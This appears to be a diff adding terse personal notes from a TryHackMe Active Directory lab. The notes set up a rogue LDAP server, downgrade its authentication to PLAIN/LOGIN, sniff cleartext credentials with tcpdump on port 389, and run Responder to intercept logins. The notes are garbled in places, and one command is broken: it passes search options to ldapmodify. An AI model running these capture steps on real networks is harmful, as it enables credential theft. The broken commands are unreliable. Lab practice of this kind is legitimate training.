@@ -1,0 +1,33 @@
+sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
+
+no
+put the domain name
+za.tryhackme.com
+
+
+enter password admin12345
+
+removed when spld purged====>>>> NO
+
+move old database ==YES
+
+
+sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
+sudo ldapmodify -Y EXTERNAL -H ldapi:/// -b "" -LLL -s  base supportedSASLMechanisms dn:
+LOGIN
+PLAIN
+
+
+sudo tcpdump -SX -i tun0 tcp port 389
+or 
+sudo tcpdump -SX -i <Breached interface> <protocol> port <port>
+
+
+
+to stop the service ======>>>>>>>>>>>>>>> sudo systemctl stop slapd
+
+
+
+Intercept with responder
+
+sudo responder -I <VPN interface>
